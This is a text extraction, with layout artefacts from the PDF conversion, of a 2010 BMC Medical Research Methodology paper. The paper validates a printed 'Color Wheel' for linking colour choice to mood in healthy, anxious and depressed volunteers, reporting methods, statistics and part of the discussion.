+## 36.745.729.0
+## 42.957.241.1
+## 47.868.449.4
+## 50.560.947.1
+## 16.28.235.87
+## 25.013.114.7
+## 40.518.631.2
+## 64.213.657.0
+## 86.3-4.4183.7
+## 88.7-7.7585.7
+## 91.3-7.5054.2
+## 92.0-5.3217.3
+## 35.7-49.815.0
+## 45.6-70.023.3
+## 50.9-58.530.7
+## 60.1-41.823.9
+## 1
+## 2
+## 3
+## 4
+## 5
+## 6
+## 7
+## 8
+## 9
+## 10
+## 11
+## 12
+## 13
+## 14
+## 15
+## 16
+## 17
+## 18
+## 19
+## 20
+## 21
+## 22
+## 23
+## 24
+## 25
+## 26
+## 27
+## 28
+## 29
+## 30
+## 31
+## 32
+## 33
+## 34
+## 35
+## 36
+## 37
+## 38
+Figure 1Colors used in the Color Wheel. Colors are shown with
+their corresponding L*a*b* D50 coordinates (CIE 1931; 2 degree
+Observer). White 38 also corresponds to the paper on which the
+Color Wheel was printed.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 2 of 13
+
+be seen from Figure 2, each color of the Color Wheel
+has been given a number to facilitate selection by those
+viewing the instrument as well as for the purposes of
+analysing the results. As some of the studies using the
+Color Wheel involved posting the questionnaire to par-
+ticipants, it was decided to use a printed version of the
+instrument rather than presenting it on a computer
+screen. To ensure homogeneity of color presentation all
+batches of the instrument were printed at the same time
+on bright-white paper. Like most bright-white papers,
+this paper contains optical brightening agents, which
+add some blue to the yellowish paper base, and which
+makes it look whiter. It was not possible to control for
+lighting conditions, but subjects were asked to complete
+the questionnaire under daylight conditions. Because the
+Color Wheel fills only a small portion of the printed
+page, and because the printed page covers a significant
+portion of the subject’s field-of-view, the subject’s vision
+adapts to the paper white, and all colors, chromatic and
+achromatic, are perceived in relation to this white. This
+relationship between the paper white and how the col-
+ors are perceived is important to maintain if the same
+colors are required in further studies. The measured
+paper white is actually the color used for white in the
+Color Wheel (White 38).
+- Ethical approval
+Ethical approval was sought and attained for all aspects
+of this study from the South Manchester Local Research
+Ethics Committee and all subjects gave written consent
+before participating.
+Study 1:‘Drawn to’,‘favourite’and‘mood’colors with
+reproducibility in healthy volunteers
+## Themainaimofthisstudywastodeviseamethodof
+presenting colors to individuals in order to relate color
+choice to a particular question. For the purpose of vali-
+dation, it was felt that‘favourite’color would be a reli-
+able question as there is reasonably good existing
+evidence on‘favourite’colors.‘Mood’color would also
+provide an opportunity to study the instrument in a
+state where color choice is very likely to be consistently
+distorted, such as depression.‘Drawn to’color was sug-
+gested to us by several members of the focus groups
+and  provided  another  parameter  for  checking
+consistency.
+Following advertisement by global email to all employ-
+ees at the University Hospital of South Manchester, 123
+healthy volunteers (aged 22-70, mean age 42.2 years,
+105 (85%) females, 18 (15%) males) were recruited and
+completed a color questionnaire using the Color Wheel.
+The following questions were asked: 1. Which color do
+you feel most drawn to? 2. Which is your favourite
+color? 3. With regard to your day-to-day mood over the
+last few months - do you associate it with a particular
+color? If so, which color? All participants were also
+asked to complete the Hospital Anxiety and Depression
+(HAD) Scale[19] so that those with significant anxiety
+and depression (score of 10 or greater for each domain)
+could be excluded. People suffering from any functional
+disorder or any other significant illness such as diabetes
+or heart disease were also excluded as were individuals
+with color blindness. 16 subjects had anxiety and 2
+depression leaving 105 volunteers (aged 22-70 years,
+mean age 42.8 years, 90 (86%) females, 15 (14%) males)
+available for study. 59 of the volunteers were asked to
+repeat the study two weeks later to assess reproducibil-
+ity. The percentage of respondents selecting an indivi-
+dual color in terms of it being their‘favourite’color,
+‘mood’color or the color they were‘drawn to’was
+calculated.
+Study 2: Positive and negative colors and their
+reproducibility in healthy volunteers
+It was anticipated that there might be a wide variation
+in choice of colors when individuals were asked to select
+just one color in the first study. Furthermore, it seemed
+possible that different shades of the same colors may
+not necessarily have the same connotations for a parti-
+cular person. Thus it may not be appropriate for the
+purposes of interpretation to group shades of the same
+color together and it could be that different shades of
+different colors may clusterbetter. It was therefore
+decided to study a further group of 255 healthy volun-
+teers asking the following questions: 1. Which color or
+colors do you associate with a positive mood? 2. Which
+color or colors do you associate with a negative mood?
+Recruitment methods were identical to Study 1 as well
+as the inclusion and exclusioncriteria of participants.
+Of the 255 individuals questioned 51 had anxiety and 5
+depression (all 5 depressed subjects also had anxiety) on
+the HAD Scale[19] and were therefore excluded leaving
+204 healthy volunteers (aged 18-72 years, mean age 38.5
+years, 140 (69%) females, 64 (31%) males) for analysis.
+59 participants were re-interviewed two weeks later to
+assess reproducibility. For each color the percentage of
+individuals rating it positive or negative was calculated.
+Study 3: Color choice in anxious and depressed
+individuals
+Following advertisement in a local newspaper and by
+global email to all University of Manchester and Univer-
+sity Hospital of South Manchester employees, 269 indi-
+viduals claiming to be either anxious or depressed
+completed a color questionnaire with the aid of the
+Color Wheel via the post. They were also asked to com-
+plete the HAD Scale[19] to confirm the presence of
+anxiety or depression with a score above 9 for either
+anxiety or depression being indicative of significant
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 3 of 13
+
+morbidity. Of the respondents, 51 had either a HAD
+anxiety or depression score of 9 or less or were suffering
+from a functional disorder or another significant illness
+or color blindness. These individuals were excluded
+from the study leaving 108 anxious (aged 18-70 years,
+mean age 35.7 years, 86 (80%) females, 22 (20%) males)
+and 110 depressed individuals (aged 19-76 years, mean
+age 40.6 years, 74 (67%) females, 36 (33%) males) for
+the analysis.
+All patients were asked: 1. Which color do you feel
+most drawn to? 2. Which color is your favourite color?
+- With regard to your day-to-day mood over the last
+few months - do you associate it with a particular color?
+If so, which color? Is there a reason why you have cho-
+sen this color? Comparisons were made with data
+obtained for healthy controls in Study 1. In addition to
+analysing the data regarding the individual color choices,
+the responses in terms of positive, neutral and negative
+colors were also documented. This allowed the beha-
+viour of the different permutations to be compared
+between healthy, anxious and depressed individuals.
+Statistical analysis
+The percentage of respondents selecting an individual
+color in terms of it being their‘favourite’color,‘mood’
+color or the color they were‘drawn to’was calculated.
+The statistical package SPSS 11.5 was used for analys-
+ing the data. Parametric tests were used for the Nor-
+mally distributed data. The distribution of data was
+assessed by calculating skewness and kurtosis statistics.
+The Pearson Chi-squared test was used to assess rela-
+tionships between categorical variables and the Fisher’s
+Exact test where the volunteer numbers were small.
+ANOVA was used to compare the mean values of anxi-
+ety and depression with the individual color groupings
+of each permutation with regard to mood and multiple
+comparisons were carried out using the Scheffé Post-
+hoc test[20] on the same data.
+Non-Normally distributed data were analysed using
+Spearman’s correlation, for example, when assessing the
+relationship between the mean anxiety scores and the
+various color groupings.
+## Results
+## Study 1
+With regard to‘drawn to’color 104 (99%) of the 105
+healthy volunteers answered this question with 14 (14%)
+participants choosing‘Yellow 14’as their most popular
+‘drawn to’color. 103 (98%) subjects answered the ques-
+tion regarding‘favourite’color with 16 (16%) choosing
+‘Blue 28’. Not one volunteer chose white or grey. With
+respect to‘mood’coloronly41(39%)ofthehealthy
+## P
+l
+e
+a
+s
+e
+
+i
+n
+d
+i
+c
+a
+t
+e
+
+b
+y
+
+p
+l
+a
+c
+i
+n
+g
+
+a
+
+c
+r
+o
+s
+s
+
+i
+n
+
+t
+h
+e
+
+b
+o
+x
+
+n
+e
+x
+t
+
+t
+o
+
+y
+o
+u
+r
+
+c
+h
+o
+i
+c
+e
+
+o
+f
+
+c
+o
+l
+o
+u
+r
+## 1
+## 2
+## 3
+## 4
+## 5
+## 6
+## 7
+## 8
+## 9
+## 10
+## 11
+## 12
+## 13
+## 14
+## 1516
+## 17
+## 18
+## 19
+## 20
+## 21
+## 22
+## 23
+## 24
+## 25
+## 26
+## 27
+## 28
+## 29
+## 30
+## 31
+## 32
+## 33
+## 34   35
+## 36
+## 37
+## 38
+Figure 2The‘Color Wheel’.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 4 of 13
+
+volunteers associated it with a color with‘Yellow14’
+being the most popular‘mood’color choice.
+## Reproducibility
+In order to assess reproducibility 59 healthy volunteers
+repeated the color questionnaire after an interval of two
+weeks. 20 (34%) individuals gave exactly the same
+‘drawn to’color response, 27 (46%) chose the same
+‘favourite’color and 38 (64%) gave the same‘mood’
+color.
+## Study 2
+The percentage of individuals rating a particular color as
+positive or negative is showninFigure3.Forinstance,
+color number 1 was considered positive by 3% and
+negative by 24% whereas color number 30 was consid-
+ered positive in 43% and negative by 2%. Thus there
+was considerable variation in the positive and negative
+attributions of the different colors. It was therefore
+necessary to establish what combination of percentages,
+both positive and negative, best gave an indication of
+whether a color should definitely be regarded as positive
+or negative with the remainder being classified as neu-
+tral. Consequently a seriesof eight permutations were
+constructed (Table 1) using varying percentages for
+what was judged a positive or negative color. For exam-
+ple, Permutation 1 definedapositivecolorasonein
+which 20% or more of individuals regarded it as positive
+and 5% or less regarded it as negative. Similarly, a color
+was defined as negative if 20% or more of individuals
+rated it as negative and 5% or less rated it as positive.
+Any colors not meeting these criteria were classified as
+neutral. Subsequent permutations became increasingly
+more restrictive. The distribution of colors in each of
+the different permutations is detailed in Figure 4. A
+further striking finding was that colors from the same
+color group (i.e. blues or reds) had completely different
+connotations for individuals, in terms of their positivity
+or negativity, depending on brightness and saturation (i.
+e. dark purple versus pale purple). Consequently, similar
+shades from different color groups, for instance dark
+greens and dark reds, were more likely to have the same
+connotation than different shades from the same color
+group.
+## Reproducibility
+In order to assess reproducibility 23 individuals repeated
+the color questionnaire two weeks later. Out of a total
+of 874 possible responses regarding choosing positive
+mood colors, 767 (88%) were exactly the same. Similarly,
+798 (91%) negative mood colors were identical when
+asked a second time.
+## Study 3
+108 (100%) anxious and 108 (98%) depressed individuals
+answered the‘drawn to’question with‘Yellow 14’being
+the most popular in both groups (anxious = 13 (12%),
+depressed = 11 (10%)). 108 (100%) anxious and 109
+(99%) depressed subjects responded to the question on
+‘favourite’color with 11 (10%) anxious choosing‘Blue
+28’as the most popular color and 18 (17%) depressed
+choosing‘Blue 27’closely followed by 15 (17%) indivi-
+duals choosing‘Blue 28’. 76 (70%) anxious and 87 (79%)
+depressed volunteers related a color to their mood with
+‘Grey 35’and‘Grey 36’monopolising the top two places
+of these two groups. 12 (16%) anxious individuals and
+19 (22%) depressed chose‘Grey 36’and 7 (9%) anxious
+and 13 (15%) depressed chose‘Grey 35’(Figure 5).
+Differences between the healthy, anxious and depressed
+volunteers with regard to‘mood’color
+It was thought that analysing the results of the healthy,
+anxious and depressed individuals would help to deter-
+mine which of the permutations described in Study 2
+would be the most reliable and robust for use in future
+studies. However, since there were no differences
+between the three groups of participants with regard to
+‘drawn to’and‘favourite’colors, it was unnecessary to
+assess this with respect to positive and negative colors.
+In contrast, there were striking differences with regard
+to color choice and mood between the three groups of
+volunteers. 87 (79%) depressed, 76 (70%) anxious and
+only 41 (39%) healthy subjects answered the question on
+mood and color with the difference between healthy and
+depressed subjects being highly significant (Chi-square
+(1) = 35.756; p < 0.001). The percentage of participants
+choosing an individual color in relation to their mood is
+showninFigure5.Ascanbeseen,‘Grey 36’was the
+most common color chosen by the anxious and
+depressed groups in contrast to‘Yellow 14’in the
+healthy volunteers. It is noteworthy that healthy indivi-
+duals tended to choose saturated colors, the anxious
+were largely random and the depressed group largely
+chose desaturated colors.
+Comparison of color choice between the eight permutations
+of‘mood’colors in healthy, anxious and depressed
+volunteers
+Table 2 compares the positive, neutral and negative
+color choice in those healthy, anxious and depressed
+volunteers choosing a color to describe their mood. As
+can be seen, there were highly significant differences
+between color choice and the three volunteer groups in
+all eight permutations (p < 0.001). Depressed individuals
+showed a striking preference for negative colors choos-
+ing relatively few positive colors when compared to
+healthy controls. Anxious individuals gave results inter-
+mediate to those observed in depression with negative
+colors being chosen more frequently as well as positive
+colors being chosen less frequently. All specific compari-
+sons between healthy versus anxious and healthy versus
+depressed revealed a significance of p < 0.005.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 5 of 13
+
+Relationship between eight permutations of positive,
+neutral and negative‘mood’colors and mean anxiety and
+depression scores in healthy, anxious and depressed
+volunteers
+To further attempt to understand the relationship
+between mood and color choice (positive, neutral or
+negative) the results for healthy volunteers as well as
+individuals with anxiety or depression were all plotted
+together for each permutation (Figures 6 and 7). This
+form of presentation gave an instant impression of the
+different color choices by the different groups of
+individuals.
+Healthy volunteer group
+Onfirstimpression,itappears that the mean anxiety
+scores for healthy individuals in Figures 6 and 7 were
+higher for those choosing a negative color than for
+those choosing a positive or neutral color. However this
+did not reach statistical significance. In contrast, depres-
+sion scores in healthy volunteers did relate to positive,
+neutral and negative color choice and reached signifi-
+cance for all permutations except 2 and 4 which showed
+atrendinthesamedirection.Thosewithhigherscores
+for depression, even though they were still within the
+normal range, were more likely to choose a negative
+color and this effect was most marked in Permutations
+7 and 8 (rho = 0.412; p = 0.008).
+Anxious volunteer group
+In anxious volunteers, the mean anxiety scores did relate
+to positive, neutral and negative color choice and
+reached significance for all permutations. Those with
+higher scores for anxiety were more likely to choose a
+negative color and this effect was most marked in Per-
+mutation 4 (rho = 0.377; p = 0.001). In contrast, the
+mean depression score for anxious individuals was simi-
+lar irrespective of whether they chose a positive, neutral
+or negative color as determined by any of the
+permutations.
+Depressed volunteer group
+The mean depression scores in the depressed volunteer
+group related to color choice and reached significance
+## P
+## 123491011125678
+## 37    38
+## 13    1415162122232417181920
+## 25    2627283334353629303132
+## N
+## 3
+## %
+## No.
+## No.
+## No.
+## No.
+## 24
+## PN
+## 914
+## PN
+## 36 19
+## PN
+## 25 13
+## PN
+## 822
+## PN
+## 31  7
+## PN
+## 29  6
+## PN
+## 33  4
+## PN
+## 0.5  54
+## PN
+## 0.5 44
+## PN
+## 0.5 29
+## PN
+## 29
+## PN
+## 47
+## %
+## 0.5
+## PN
+## 72 0.5
+## PN
+## 52  0
+## PN
+## 26  3
+## PN
+## 330
+## PN
+## 14  6
+## PN
+## 28  1
+## PN
+## 32  2
+## PN
+## 29  5
+## PN
+## 28   2
+## PN
+## 22  1
+## PN
+## 20  4
+## PN
+## 3
+## %
+## 49
+## PN
+## 627
+## PN
+## 11 17
+## PN
+## 30 10
+## PN
+## 35  3
+## PN
+## 43  2
+## PN
+## 42  2
+## PN
+## 57  1
+## PN
+## 174
+## PN
+## 067
+## PN
+## 072
+## PN
+## 062
+## PN
+## 1%50
+## PN
+## P
+## N
+## =
+## =
+positive
+negative
+## 11 12
+Figure 3Positive and negative ratings for each color by healthy volunteers. The percentage of healthy volunteers who rated each color
+on the‘Color Wheel’as either positive (P) or negative (N) is shown. For example, 72% of participants rated Yellow 14 as positive whereas 0.5%
+rated it negative in contrast only 1% of volunteers rated Black 33 as positive whereas 74% rated it as negative.
+Table 1 Construction of the eight permutations.
+Permutation 1Positive color =≥20 (pos) and≤5 (neg)
+Negative color =≥20 (neg) and≤5 (pos)
+Permutation 2Positive color =≥20 (pos) and≤10 (neg)
+Negative color =≥20 (neg) and≤10 (pos)
+Permutation 3Positive color =≥30 (pos) and≤5 (neg)
+Negative color =≥30 (neg) and≤5 (pos)
+Permutation 4Positive color =≥30 (pos) and≤10 (neg)
+Negative color =≥30 (neg) and≤10 (pos)
+Permutation 5Positive color =≥40 (pos) and≤5 (neg)
+Negative color =≥40 (neg) and≤5 (pos)
+Permutation 6Positive color =≥40 (pos) and≤10 (neg)
+Negative color =≥40 (neg) and≤10 (pos)
+Permutation 7Positive color =≥50 (pos) and≤5 (neg)
+Negative color =≥50 (neg) and≤5 (pos)
+Permutation 8Positive color =≥50 (pos) and≤10 (neg)
+Negative color =≥50 (neg) and≤10 (pos)
+In Permutation 1 a color was defined as positive if 20% or more of individuals
+regarded it as positive and 5% or less regarded it as negative. Similarly, a
+color was regarded as negative if 20% or more of individuals regarded it as
+negative and 5% or less of individuals regarded it as positive. Subsequent
+permutations used varying degrees of positivity and negativity.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 6 of 13
+
+in Permutation 4 (rho = 0.211; p = 0.049) with Permuta-
+tions 3, 5 and 6 also showing trends in the same direc-
+tion.  Likewise,  the  mean  anxiety  scores  were
+significantly related to positive, neutral and negative
+color choice irrespective of permutation. The higher the
+anxiety score the more likely they were to choose a
+negative color and this effect was greatest in Permuta-
+tion 4 (rho = 0.295; p = 0.005).
+Relationship between eight permutations of positive,
+neutral and negative‘mood’colors as well as no color
+choice at all and mean anxiety and depression scores in
+healthy, anxious and depressed volunteers
+The opportunity was also taken to compare anxiety and
+depression scores in individuals choosing positive, neu-
+tral and negative colors and compare these with indivi-
+duals choosing no color at all. This was undertaken in
+order to ascertain whether individuals choosing no color
+differed in any way from the others.
+Healthy volunteer group
+The scores in individuals who did not choose a color
+appeared to approximate to those observed in subjects
+choosing positive or neutral colors. However, the anxiety
+and depression scores for those not choosing a color
+appeared to be lower than in those choosing negative
+colors and in the case of the depression scores the
+difference was always significant irrespective of permuta-
+tion. This difference was most marked in Permutations
+7 and 8 (p = 0.005; negative color: mean = 5.5; CI = 3.4,
+7.6 and no color at all: mean 1.8; CI = 1.4, 2.3). (The
+results were expressed as mean 95% confidence
+intervals).
+Anxious volunteer group
+In all permutations the anxiety and depression scores
+for those not choosing a color were lower than in those
+choosing negative colors with the difference for anxiety
+scores always reaching significance and being most
+marked in Permutation 4 (F(3,104) = 4.692; p = 0.004).
+The mean depression scores in individuals who did not
+choose a color approximated to those observed in sub-
+jects choosing positive or neutral colors.
+Depressed volunteer group
+The anxiety and depression scores for those not choos-
+ing a color were lower than those choosing neutral and
+negative colors and reached significance in the case of
+the anxiety scores, irrespective of permutation. This dif-
+ference between individuals choosing a negative color or
+no color at all was most marked in Permutations 3 and
+4 (F(3,106) = 5.644; p = 0.001 and F(3,106) = 5.633; p =
+0.001 respectively). The mean depression scores were
+also significantly different with respect to color choice
+## Permutation 1
+## 1
+## 234
+## 910
+## 11
+## 5
+## 8
+## 37
+## 38
+## 13
+## 14  15
+## 16
+## 21
+## 22
+## 23  24
+## 17
+## 19
+## 20
+## 25
+## 26
+## 27
+## 28
+## 33
+## 34
+## 35  36
+## 29
+## 30
+## 31
+## 32
+## 12
+## 6
+## 7
+## 18
+PositiveNeutralNegative
+## Permutation 2
+## 1
+## 2
+## 3
+## 4
+## 9
+## 10
+## 11
+## 5
+## 8
+## 37
+## 38
+## 13
+## 14
+## 15
+## 16
+## 21
+## 22
+## 23
+## 24
+## 17
+## 19
+## 20
+## 25
+## 26
+## 27
+## 28
+## 33
+## 34
+## 35
+## 36
+## 29
+## 30
+## 31
+## 32
+## 12
+## 6
+## 7
+## 18
+PositiveNeutralNegative
+## Permutation 3
+## 1
+## 2
+## 3
+## 4
+## 9
+## 10
+## 11
+## 5
+## 8
+## 37
+## 38
+## 13
+## 14  15
+## 16
+## 21
+## 22
+## 23
+## 24
+## 17
+## 19
+## 20
+## 25
+## 26
+## 27
+## 28
+## 33
+## 34
+## 35
+## 36
+## 29
+## 30
+## 31
+## 32
+## 12
+## 6
+## 7
+## 18
+PositiveNeutralNegative
+## Permutation 4
+## 1
+## 2
+## 3
+## 4
+## 9
+## 10
+## 11
+## 5
+## 8
+## 37
+## 38
+## 13
+## 14
+## 15
+## 16
+## 21
+## 22  23
+## 24
+## 17
+## 19
+## 20
+## 25
+## 26
+## 27
+## 28
+## 33
+## 34
+## 35
+## 36
+## 29
+## 30
+## 31
+## 32
+## 12
+## 6
+## 7
+## 18
+## Positive
+## Neutral
+## Negative
+Permutation 5 & 6Permutation 7 & 8
+## 1
+## 23
+## 4
+## 9
+## 10
+## 11
+## 5
+## 8
+## 37
+## 38
+## 13
+## 14  15
+## 16
+## 21
+## 22  23
+## 24
+## 17
+## 19
+## 20
+## 25
+## 26
+## 27
+## 28
+## 33
+## 34
+## 35
+## 36
+## 29
+## 30
+## 31
+## 32
+## 12
+## 6
+## 7
+## 18
+PositiveNeutralNegative
+## 1
+## 2
+## 3
+## 4
+## 9
+## 10  11
+## 5
+## 8
+## 38
+## 13
+## 14  15
+## 16
+## 21
+## 22
+## 23
+## 24
+## 17
+## 19
+## 20
+## 25
+## 26
+## 27
+## 28
+## 33
+## 34
+## 35
+## 36
+## 29
+## 30
+## 31
+## 32
+## 12
+## 6
+## 7
+## 18
+## 37
+PositiveNeutral
+## Negative
+Figure 4Distribution of colors throughout the eight permutations. The construction of the eight permutations is fully described in Table 1.
+Permutations 1 and 2 are the most inclusive of positive and negative colors whereas Permutations 7 and 8 are the most restrictive. If a shade
+was considered neither positive nor negative in a particular permutation it was classified as neutral.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 7 of 13
+
+with this difference being most marked in Permutations
+5 and 6 (F(3,106) = 5.201; p = 0.002).
+## Discussion
+Colors are all about us and the sheer variety of shades
+used in, for instance interior decorations, are an indica-
+tion of the wide range of preferences that exist. This
+study describes a novel way of documenting the color
+preferences of individuals which is extremely easy to
+use.
+In addition to studying healthy volunteers it was felt
+necessary to also include a group of individuals in
+whom color choice might be distorted. It was hypothe-
+sisedthatpeoplewithdepressionwouldbemostlikely
+to show a definite effect between color and mood as
+even in every day life dark colors are often regarded as
+depressing. Individuals with anxiety were also studied to
+test the discriminant power of using color to define
+mood. In other words, if anxious individuals selected
+different colors it would suggest that color choice is
+## 0
+## 5
+## 10
+## 15
+## 20
+## 25
+## 0
+## 5
+## 10
+## 15
+## 20
+## 25
+## 0
+## 5
+## 10
+## 15
+## 20
+## 25
+Mood color choice (%)
+Mood color choice (%)
+Mood color choice (%)
+## Healthy
+n=41
+## Anxious
+n=76
+## Depressed
+n=87
+Individual colors of the ‘Color Wheel’
+## 1
+## 2
+## 3
+## 4
+## 5
+## 67
+## 89
+## 10
+## 11
+## 12
+## 13
+## 1415
+## 1617
+## 18
+## 1920
+## 21
+## 22
+## 23
+## 24
+## 25
+## 26
+## 27
+## 28
+## 29
+## 30
+## 31
+## 32
+## 33
+## 34
+## 35
+## 36
+## 3738
+## 123
+## 45
+## 678
+## 9
+## 10111213
+## 14
+## 1516
+## 17
+## 18
+## 19
+## 20
+## 21
+## 22
+## 2324
+## 2526
+## 27
+## 2829
+## 303132
+## 33
+## 3435
+## 36
+## 37
+## 38
+## 1
+## 23
+## 45
+## 678
+## 9
+## 10111213
+## 14
+## 15
+## 1617
+## 18
+## 19
+## 20212223
+## 24
+## 25
+## 2627
+## 28
+## 29303132
+## 333435
+## 36
+## 37
+## 38
+Figure 5Distribution of‘mood’color choice in healthy, anxious and depressed individuals. 41 (39%) healthy subjects, 76 (70%) anxious
+and 87 (79%) depressed volunteers related color to their mood. Compared with healthy volunteers, the choice of‘Yellow 14’is significantly
+reduced in both depressed (p < 0.001) and anxious (p = 0.001) individuals (Fisher’s Exact test). In contrast, compared with healthy volunteers, the
+choice of‘Grey 36’is significantly increased in depressed (p = 0.020) individuals but not in those with anxiety (p = 0.134) (Fisher’s Exact test).
+Volunteers not choosing a color to describe their mood have been omitted from the figure.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 8 of 13
+
+identifying a specific state of mind rather than just
+reflecting a more general change in mood.
+## Therewasremarkablylittledifferenceinchoiceof
+‘drawn to’or‘favourite’color between individuals irre-
+spective of whether they were healthy, anxious or
+depressed.‘Yellow 14’was the most popular‘drawn to’
+color and with respect to‘favourite’color,‘Blue 28’was
+the most popular color choice of healthy and anxious
+individuals with‘Blue 27’being the first choice of the
+depressed subjects closely followed by‘Blue 28’.These
+results are in accord with the findings of previous inves-
+tigators who similarly have found that blue was the
+favourite color choice of adults[2-4,8,21-23]. It is note-
+worthy that only two individuals chose a grey shade or
+white as their favourite color.
+The results for mood color were in stark contrast to
+those obtained for‘drawn to’and‘favourite’color. Only
+39% of healthy volunteers associated a color with their
+mood compared to 70% of anxious and 79% of
+depressed which suggests that individuals with affective
+disorders are more likely to equate their mood with a
+color.‘Grey 35’,‘Grey 36’and‘Grey 37’dominated the
+top four places of the anxious and depressed groups, a
+themebrokenonlyby7%ofanxiousindividualswho
+chose‘Red 3’to describe their mood likening it to
+anger, stress and frustration. Comments about the
+choice of grey included relating it to a dark state of
+mind, a colorless and monotonous life, gloom, misery or
+a disinterest in life rather than the color grey being cho-
+sen because of its colloquialassociationswithalow
+mood. These descriptions are in keeping with the obser-
+vations of others suggesting that depressed patients
+viewed life as“monochromatic”[24] or having“lost its
+color”[25]. It has even been suggested that depressed
+people might exhibit color impairment and that it might
+be a state or trait marker of mood disorders[26]. The
+results for the anxious and depressed individuals dif-
+fered considerably to thosein healthy volunteers who
+associated‘Yellow 14’and the yellow colors in general
+as the color most representative of their mood. Another
+noteworthy observation was that anxious and depressed
+individuals were significantly less likely to choose‘Yel-
+low 14’to describe their mood and significantly less
+likely to choose colors from either the red, orange or
+yellow color groupings. In the literature yellow has been
+reported as being associated with happiness, cheerful-
+ness and a positive emotional state[5,6,27,28]. It has
+been suggested that differences in color saturation and
+brightness are associated with different emotional feel-
+ings[29] and it is possible that this could provide an
+Table 2 Comparison of’mood’colour choice in the healthy, anxious and depressed volunteers for each permutation.
+Permutation numberColor choiceVolunteer groupp value
+## Healthy
+## (n = 41)
+## No. (%)
+respondents
+## Anxious
+## (n = 76)
+## No. (%)
+respondents
+## Depressed
+## (n = 87)
+## No. (%)
+respondents
+positive24 (59%)17 (22%)8 (9%)Chi-square (4)
+## 1neutral10 (24%)23 (30%)14 (16%)= 50.158;
+negative7 (17%)36 (47%)65 (75%)p < 0.001
+positive26 (63%)20 (26%)11 (13%)Chi-square (4)
+## 2neutral8 (20%)13 (17%)8 (9%)= 46.633;
+negative7 (17%)43 (57%)68 (78%)p < 0.001
+positive16 (39%)11 (15%)4 (5%)Chi-square (4)
+## 3neutral18 (44%)33 (43%)20 (23%)= 46.442;
+negative7 (17%)32 (42%)63 (72%)p < 0.001
+positive18 (44%)13 (17%)6 (7%)Chi-square (4)
+## 4neutral16 (39%)31 (41%)18 (21%)= 45.660;
+negative7 (17%)32 (42%)63 (72%)p < 0.001
+positive13 (32%)6 (8%)2 (2%)Chi-square (4)
+## 5 & 6neutral21 (51%)40 (53%)24 (28%)= 49.491;
+negative7 (17%)30 (40%)61 (70%)p < 0.001
+positive11 (27%)2 (3%)2 (2%)Chi-square (4)
+## 7 & 8neutral26 (63%)47 (62%)31 (36%)= 52.899;
+negative4 (10%)27 (37%)54 (62%)p < 0.001
+Comparison of healthy versus anxious and healthy versus depressed was also significant (p < 0.005) for all permutations.
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+Page 9 of 13
+
+alternative explanation for the different mood color
+responses that have beenobserved in this study. For
+instance, healthy individuals may relate their mood to
+saturated colors whereas depressed subjects choose
+desaturated colors. Color choice was not related to gen-
+der in the group as a whole and this is in accord with
+the older literature which suggests that although it may
+be different in children this is lost with adulthood. How-
+ever, there were more women in all of the study groups
+which may have reflected the method of recruitment by
+advertisement and global e-mail, although anxiety and
+depression are more common in females, which is a
+more likely explanation for the gender imbalance. Con-
+sequently it was necessary to ensure the gender distribu-
+tion of the healthy group matched that of the other two
+groups so that the gender distribution was approxi-
+mately equal across the whole study. A more recent
+study has suggested there may be differences in color
+choice between males and females[30] but this needs to
+be confirmed and does not strictly affect the validation
+of the instrument, which could actually be used to
+investigate this question in the future, especially in lar-
+ger samples. The use of antidepressants in those with
+anxiety or depression did not appear to affect color
+choice. The lens of the eye tends to become more yel-
+low with age and this could theoretically affect color
+choice. However there is evidence that this is compen-
+sated for, possibly by neural mechanisms,[31] and con-
+sequently this effect was not looked for especially as the
+number of elderly subjects was relatively small.
+It was felt that reproducibility would be an important
+part of the validation exercise to ensure that choice was
+not just a random process. Consequently a sample of
+subjects from both Study 1 and 2 were asked to repeat
+the questionnaire two weeks later. This interval was
+selected because it was felt that color choice should
+remain fairly constant over this period of time, but it
+was long enough for them to forget their original choice.
+Some interesting observations emerged when reproduci-
+bility was examined. With respect to‘drawn to’,‘favour-
+ite’and‘mood’color the reproducibility, 34%, 46% and
+64% respectively, might initially appear to be rather
+poor. However, it was noteworthy that even if an indivi-
+dual did not choose exactly the same color on the sec-
+ond occasion they often chose one closely related on the
+color spectrum, e.g.‘Red 3’on the first and‘Pink 21’on
+## 0
+positive
+## (n=49)
+neutral
+## (n=47)
+negative
+## (n=108)
+depressed (n=87)
+anxious (n=76)
+healthy (n=41)
+[rho=0.463; p<0.001]
+rho=0.240; p=0.025
+rho=0.162; p=0.133
+rho=0.284; p=0.013
+rho=0.053; p=0.651
+rho=0.229; p=0.150
+rho=0.345; p=0.027
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+HAD anxiety score
+## 0
+positive
+## (n=49)
+neutral
+## (n=47)
+negative
+## (n=108)
+[rho=0.474; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+HAD depression score
+HAD anxiety score
+HAD depression score
+HAD anxiety score
+HAD depression score
+## Permutation 1
+## Permutation 2
+## Permutation 3
+## 0
+positive
+## (n=31)
+neutral
+## (n=71)
+negative
+## (n=102)
+[rho=0.481; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+## 0
+positive
+## (n=31)
+neutral
+## (n=71)
+negative
+## (n=102)
+[rho=0.482; p<0.001]
+## 3
+## 6
+## 9
+## 12
+## 15
+## 18
+## 21
+rho=0.295; p=0.006
+rho=0.204; p=0.058
+rho=0.355; p=0.002
+rho=0.089; p=0.444
+rho=0.277; p=0.080
+rho=0.353; p=0.023
+## 0
+positive
+## (n=57)
+neutral
+## (n=29)
+negative
+## (n=118)
+[rho=0.477; p<0.001]
+## 3
+## 6
+## 9
